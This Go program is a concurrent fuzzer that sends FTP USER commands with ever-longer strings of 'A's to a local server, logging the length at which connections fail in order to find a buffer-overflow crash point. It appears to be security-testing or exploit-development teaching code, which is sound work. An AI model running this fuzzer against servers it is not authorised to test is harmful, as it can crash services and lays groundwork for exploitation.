package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"sync"
	"time"
)

const (
	TARGET_ADDR   string = "127.0.0.1:2121"
	MAX_LENGTH    int    = 2500
	WORKERS_COUNT int    = 50
)

var wg sync.WaitGroup

func main() {
	lengthChan := make(chan int, WORKERS_COUNT)

	wg.Add(WORKERS_COUNT)
	for i := 0; i < WORKERS_COUNT; i++ {
		go worker(lengthChan, TARGET_ADDR)
	}

	for length := 1; length <= MAX_LENGTH; length++ {
		lengthChan <- length
	}
	close(lengthChan)

	wg.Wait()
}

func worker(lengthChan chan int, target string) {
	defer wg.Done()

	for length := range lengthChan {
		fmt.Printf("Handle length = %d\n", length)

		var user string = ""
		for i := 0; i < length; i++ {
			user += "A"
		}

		conn, err := net.DialTimeout("tcp", TARGET_ADDR, 2*time.Second)
		if err != nil {
			log.Fatalf("[!]Error at offset %d: %s\n", length, err)
		}
		bufio.NewReader(conn).ReadString('\n')

		fmt.Fprintf(conn, "USER %s\n", user)
		bufio.NewReader(conn).ReadString('\n')

		fmt.Fprint(conn, "PASS password\n")
		bufio.NewReader(conn).ReadString('\n')

		if err := conn.Close(); err != nil {
			log.Fatalf("[!]Error at offset %d: %s\n", length, err)
		}
	}
}
